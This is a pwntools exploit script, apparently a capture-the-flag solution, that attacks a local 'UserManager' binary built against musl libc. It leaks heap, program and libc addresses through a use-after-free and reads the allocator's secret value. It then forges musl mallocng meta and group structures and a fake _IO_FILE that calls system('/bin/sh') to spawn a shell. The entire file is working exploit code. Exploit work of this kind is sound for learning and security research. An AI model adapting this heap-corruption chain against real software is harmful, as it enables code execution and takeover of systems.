from pwn import *
context(arch='amd64', log_level='debug')

elf = ELF('./UserManager')
libc = ELF('/lib/x86_64-linux-musl/libc.so')

io = process('./UserManager')

def add(id, namelen, name):
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b'Id: ', str(id).encode())
    io.sendlineafter(b'UserName length: ', str(namelen).encode())
    io.sendafter(b'UserName: ', name)

def check(id):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b'Id: ', str(id).encode())

def delete(id):
    io.sendlineafter(b': ', b'3')
    io.sendlineafter(b'Id: ', str(id).encode())

def clear():
    io.sendlineafter(b': ', b'4')

# get heap address and elf base
for i in range(5):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
add(11, 0x38, p64(11 + 0xdeadbeef00) + b'\n')
add(11, 0x78, p64(11 + 0xdeadbeef00) + b'\n')
add(9, 0x78, p64(9 + 0xdeadbeef00) + b'\n')
check(11)
io.recv(8)
heap_addr = u64(io.recv(8))
elf_base = heap_addr - 0x5A40
stdout_ptr = elf_base + 0x4D80
print(hex(elf_base))

# get libc base
clear()

for i in range(5):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
add(11, 0x38, p64(11 + 0xdeadbeef00) + b'\n')
add(11, 0x78, p64(11 + 0xdeadbeef00) + b'\n')
delete(4)
print(hex(heap_addr))

payload = p64(4)
payload += p64(stdout_ptr)
payload += p64(0x20)
payload += p64(1)
payload += p64(elf_base + 0x51e0)
payload += p64(elf_base + 0x50e0)
payload += p64(0)

add(15, 0x38, payload)

payload = p64(11)
payload += p64(stdout_ptr)
payload += p64(0x38)
payload += p64(2)
payload += p64(0xdeadbeef)
payload += p64(elf_base + 0x5120)
payload += p64(elf_base + 0x5160)

add(13, 0x38, payload)
check(11)

stdout = u64(io.recv(8))
print(hex(stdout))
libc_base = stdout - 0xAD280
sys = libc_base + libc.symbols['system']
__malloc_context = libc_base + 0xAD9C0
print(hex(libc_base))

clear()

for i in range(6):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
clear()

for i in range(4):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
add(11, 0x38, p64(11 + 0xdeadbeef00) + b'\n')
add(11, 0x78, p64(11 + 0xdeadbeef00) + b'\n')
delete(3)
print(hex(heap_addr))

payload = p64(4)
payload += p64(__malloc_context)
payload += p64(0x20)
payload += p64(1)
payload += p64(elf_base + 0x51e0)
payload += p64(elf_base + 0x50e0)
payload += p64(0)

add(15, 0x38, payload)

payload = p64(11)
payload += p64(__malloc_context)
payload += p64(0x38)
payload += p64(2)
payload += p64(0xdeadbeef)
payload += p64(elf_base + 0x5120)
payload += p64(elf_base + 0x5160)

add(13, 0x38, payload)
check(11)
secret = u64(io.recv(8))
print(hex(secret))

clear()
for i in range(8):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
clear()

payload = p64(secret)       # meta_area.secret          0x0
payload += p64(0)           # meta_area.next
payload += p64(0x65)        # meta_area.nslots (struct meta[])          0x10
payload += p64(stdout_ptr-0x10)  # meta.prev (struct meta*)
payload += p64(libc_base - 0x6000 + 0x1000 + 0x60)  # meta.next (struct meta*)                  0x20
payload += p64(libc_base - 0x6000 + 0x1000 + 0x50)  # meta.mem (struct group*)
payload += p32(0)           # meta.avail_mask
payload += p32(0)           # meta.free_mask
payload += p64(0 + (1 << 5) + (3 << 6))     # meta.last_idx, freeable, size_class, maplen(=0)       0x30
payload += p64(0) * 2
payload += p64(libc_base - 0x6000 + 0x1000 + 0x18)  # group.meta (struct meta*)     0x48
payload += p64(0x800000000006)           # group.active_idx
fake_file = flat({
        0: b"/bin/sh\x00",
        0x28: 0xdeadbeef,
        0x38: 0xcafebabe,
        0x48: sys
    }, filler=b'\x00')
payload += fake_file                # fake _IO_FILE struct, 0x58

for i in range(4):
    add(i, 0x78, p64(0xdeadbeef00 + i) + b'\n')
add(100, 0x38, p64(0xdeadbeef) + b'\n')
add(100, 0x1300, cyclic(0x1000 - 0x40) + payload + b'\n')
delete(3)
add(99, 0x38, p64(101) + p64(libc_base - 0x6000 + 0x1000 + 0x60) + p64(0x38) + p64(2) + p64(0xdeadbeef) + p64(0) * 2)
add(98, 0x38, p64(101) + p64(libc_base - 0x6000 + 0x1000 + 0x60) + p64(0x38) +
    p64(2) + p64(0xdeadbeef) + p64(libc_base - 0x1f00) + p64(0))
gdb.attach(io)
time.sleep(1)
delete(101)


io.interactive()